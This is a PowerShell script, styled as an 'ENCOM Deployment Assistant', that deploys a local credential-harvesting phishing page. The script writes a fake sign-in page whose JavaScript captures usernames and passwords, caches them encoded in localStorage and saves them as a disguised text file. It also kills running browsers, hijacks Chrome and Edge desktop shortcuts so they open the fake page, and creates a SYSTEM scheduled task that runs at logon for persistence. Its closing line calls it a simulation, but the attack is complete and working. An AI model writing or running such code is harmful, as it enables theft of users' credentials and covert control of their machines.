Write-Output "[+] Initializing ENCOM Deployment Assistant..."

$WebPath = "C:\Users\Public\login.html"

# ----------------------------------------------------
# STEP 1: Deploy the Self-Contained HTML Login Page
# ----------------------------------------------------
Write-Output "[+] Generating local credential harvester to $WebPath..."

$HtmlCode = @'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ENCOM OS-12 // Terminal Sign-In</title>
    <style>
        body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 90vh; margin: 0; }
        .box { width: 400px; padding: 30px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: center; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; background: #040c1a; border: 1px solid #4facfe; color: #fff; margin-bottom: 20px; box-sizing: border-box; }
        button { background: #00f2fe; color: #020208; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
        button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
    </style>
</head>
<body>
<div class="box">
    <h2>Grid Node Authentication</h2>
    <p>INTERNAL WORKSTATION ACCESS ONLY</p>
    <form onsubmit="harvestCredentials(event)">
        <input type="text" id="u" placeholder="IDENTITY HANDLE" required autocomplete="off">
        <input type="password" id="p" placeholder="ACCESS TOKEN" required>
        <button type="submit">Establish Handshake</button>
    </form>
</div>
<script>
function harvestCredentials(event) {
    event.preventDefault();
    const username = document.getElementById('u').value;
    const password = document.getElementById('p').value;
    const logData = `[HARVEST CAPTURE] USER: ${username} | PASS: ${password}\n`;
    localStorage.setItem('stolen_token_cache', btoa(logData));
    const blob = new Blob([logData], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    link.download = 'encom_session_debug.txt';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    alert("CRITICAL LINK ERROR: Connection timeout. Redirecting to backup terminal node...");
}
</script>
</body>
</html>
'@

Set-Content -Path $WebPath -Value $HtmlCode -Force

# ----------------------------------------------------
# STEP 2: Force-Kill Active Browser Background Tasks
# ----------------------------------------------------
Write-Output "[+] Flushing current browser caching states..."
Stop-Process -Name chrome, msedge -ErrorAction SilentlyContinue

# ----------------------------------------------------
# STEP 3: Hijack Desktop Shortcuts Natively
# ----------------------------------------------------
Write-Output "[+] Modifying User Desktop Application Shortcuts..."

$Shell = New-Object -ComObject WScript.Shell
$Shortcuts = @(
    "$env:PUBLIC\Desktop\Google Chrome.lnk",
    "$env:USERPROFILE\Desktop\Google Chrome.lnk",
    "$env:PUBLIC\Desktop\Microsoft Edge.lnk",
    "$env:USERPROFILE\Desktop\Microsoft Edge.lnk"
)

foreach ($Path in $Shortcuts) {
    if (Test-Path $Path) {
        $Shortcut = $Shell.CreateShortcut($Path)
        $Shortcut.TargetPath = "cmd.exe"
        $Shortcut.Arguments = '/c start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --new-window "C:\Users\Public\login.html"'
        $Shortcut.Save()
        Write-Output "    - Hijacked: $Path"
    }
}

# ----------------------------------------------------
# STEP 4: Register Persistence via Scheduled Task
# ----------------------------------------------------
Write-Output "[+] Setting up persistent system configuration..."

$TaskAction = "cmd.exe /c start chrome.exe --new-window `"C:\Users\Public\login.html`""
schtasks /create /tn "EncomGridSync" /tr $TaskAction /sc onlogon /ru "SYSTEM" /f | Out-Null

Write-Output "[+] Execution complete. Simulation assets deployed successfully."
